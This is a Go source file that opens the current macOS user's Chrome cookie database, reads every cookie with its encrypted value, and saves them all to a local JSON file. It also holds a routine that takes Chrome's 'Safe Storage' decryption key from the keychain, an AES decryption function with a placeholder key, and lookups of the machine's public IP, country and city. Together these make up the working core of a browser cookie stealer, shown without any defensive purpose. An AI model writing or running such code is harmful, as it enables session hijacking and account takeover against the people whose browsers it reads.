package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/user"
	"time"

	"github.com/keybase/go-keychain"
	_ "github.com/mattn/go-sqlite3"
)

type Cookie struct {
	Name           string `json:"name"`
	Value          string `json:"value"`
	Domain         string `json:"domain"`
	Path           string `json:"path"`
	Expires        int64  `json:"expires"`
	Secure         bool   `json:"secure"`
	Session        any    `json:"session"`
	HttpOnly       bool   `json:"httpOnly"`
	SameSite       string `json:"sameSite"`
	EncryptedValue string `json:"encryptedValue"`
}

func main() {
	cookieData, err := getCookies()

	if err != nil {
		log.Fatal(err)
	}

	jsonData, err := json.Marshal(cookieData)
	if err != nil {
		log.Fatal(err)
	}

	err = os.WriteFile("data.json", jsonData, 0644)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("JSON data saved to file.")

}

func getCookies() (cookies []Cookie, err error) {
	osUser, _ := getOsUserData()
	cookiesPath := fmt.Sprintf("/Users/%s/Library/Application Support/Google/Chrome/Default/Cookies", osUser.Username)

	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", cookiesPath))
	if err != nil {
		return nil, err
	}
	defer dbConn.Close()

	rows, err := dbConn.Query("SELECT host_key as Domain, expires_utc as Expires, is_httponly as HttpOnly, name as Name, path as Path, samesite as SameSite, is_secure as Secure, is_persistent as Session, value as Value, encrypted_value as EncryptedValue FROM cookies;")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	for rows.Next() {
		var cookie Cookie
		err = rows.Scan(&cookie.Domain, &cookie.Expires, &cookie.HttpOnly, &cookie.Name, &cookie.Path, &cookie.SameSite, &cookie.Secure, &cookie.Session, &cookie.Value, &cookie.EncryptedValue)
		if err != nil {
			log.Printf("Error scanning row: %s", err)
		}

		switch cookie.SameSite {
		case "-1":
			cookie.SameSite = "None"
		case "0":
			cookie.SameSite = "Unspecified"
		case "1":
			cookie.SameSite = "Strict"
		case "2":
			cookie.SameSite = "Lax"
		default:
			cookie.SameSite = "Unknown"
		}
		cookie.Expires = (cookie.Expires / 1000000) - 11644473600

		cookies = append(cookies, cookie)
	}

	return
}

func decryptValue(encryptedValue string) (string, error) {
	decryptionKey := "your_decryption_key"

	// Decode the base64 encrypted value
	encryptedData, err := base64.StdEncoding.DecodeString(encryptedValue)
	if err != nil {
		log.Fatalf("Error decoding base64: %s", err)
	}

	// Convert the decryption key to bytes
	key := []byte(decryptionKey)

	// Create a new AES cipher block using the key
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalf("Error creating new AES cipher block: %s", err)
	}

	// Create an AES CBC decrypter
	decrypter := cipher.NewCBCDecrypter(block, make([]byte, aes.BlockSize))
	decryptedData := make([]byte, len(encryptedData))

	// Decrypt the encrypted data
	decrypter.CryptBlocks(decryptedData, encryptedData)

	// Remove padding from the decrypted data
	decryptedData = removePadding(decryptedData)

	return string(decryptedData), nil
}

// removePadding removes PKCS7 padding from the decrypted data
func removePadding(data []byte) []byte {
	padding := int(data[len(data)-1])
	return data[:len(data)-padding]
}

type UserData struct {
	OSUser user.User
	IPData IPData
}

func getOsUserData() (*user.User, error) {
	usr, err := user.Current()
	if err != nil {
		return &user.User{}, err
	} else {
		return usr, nil
	}
}

func getEncryptionKey() (string, error) {
	var err error

	query := keychain.NewItem()
	query.SetSecClass(keychain.SecClassGenericPassword)
	query.SetService("Chrome Safe Storage")
	query.SetAccount("Chrome")
	query.SetMatchLimit(keychain.MatchLimitOne)
	query.SetReturnData(true)
	results, err := keychain.QueryItem(query)
	if err != nil {
		return "", err
	} else if len(results) != 1 {
		return "", fmt.Errorf("password not found")
	}

	return string(results[0].Data), nil
}

type IPData struct {
	IP      string
	Country string
	City    string
}

func getIPData() (IPData, error) {
	ip, err := fetchData("https://api64.ipify.org")
	if err != nil {
		fmt.Printf("Error retrieving IP: %s", err)
		return IPData{}, err
	}

	country, err := fetchData(fmt.Sprintf("https://ipapi.co/%s/country_name", ip))
	if err != nil {
		fmt.Printf("Error retrieving Country: %s", err)
		return IPData{}, err
	}

	time.Sleep(time.Millisecond * 500)

	city, err := fetchData(fmt.Sprintf("https://ipapi.co/%s/city", ip))
	if err != nil {
		fmt.Printf("Error retrieving City: %s", err)
		return IPData{}, err
	}

	return IPData{
		IP:      ip,
		Country: country,
		City:    city,
	}, nil
}

func fetchData(url string) (string, error) {
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}
